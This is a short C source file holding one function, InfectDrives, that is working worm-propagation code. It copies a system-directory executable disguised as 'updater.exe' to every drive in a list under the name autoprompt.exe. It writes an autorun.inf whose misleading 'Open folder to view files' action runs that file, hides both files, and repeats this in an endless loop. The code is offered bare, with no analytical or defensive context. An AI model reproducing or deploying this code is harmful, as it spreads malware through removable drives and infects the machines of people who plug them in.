#include "data_globals.h"
#include <stdio.h>
#include <string.h>

void InfectDrives(void)
{
    char IFile[256], NewFile[256], Autorun[256], InfFile[256];
    int i;

    GetSystemDirectoryA(IFile, sizeof(IFile));
    strcat(IFile, "\\updater.exe");

    while (1) {
        for (i = 0; Inf_Drives[i]; i++) {
            memset(NewFile, 0, sizeof(NewFile));
            memset(Autorun, 0, sizeof(Autorun));
            memset(InfFile, 0, sizeof(InfFile));

            strcpy(NewFile, Inf_Drives[i]);
            strcpy(Autorun, Inf_Drives[i]);

            strcat(NewFile, "\\autoprompt.exe");
            strcat(Autorun, "\\autorun.inf");

            if (CopyFileA(IFile, NewFile, FALSE)) {
                FILE *runfile = fopen(Autorun, "wb");
                if (runfile) {
                    sprintf(InfFile,
                            "[autorun]\r\nopen=autoprompt.exe\r\naction=Open folder to view files\r\n");
                    fputs(InfFile, runfile);
                    fclose(runfile);
                }
                SetFileAttributesA(NewFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
                SetFileAttributesA(Autorun, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
            }
        }
        Sleep(5000);
    }
}
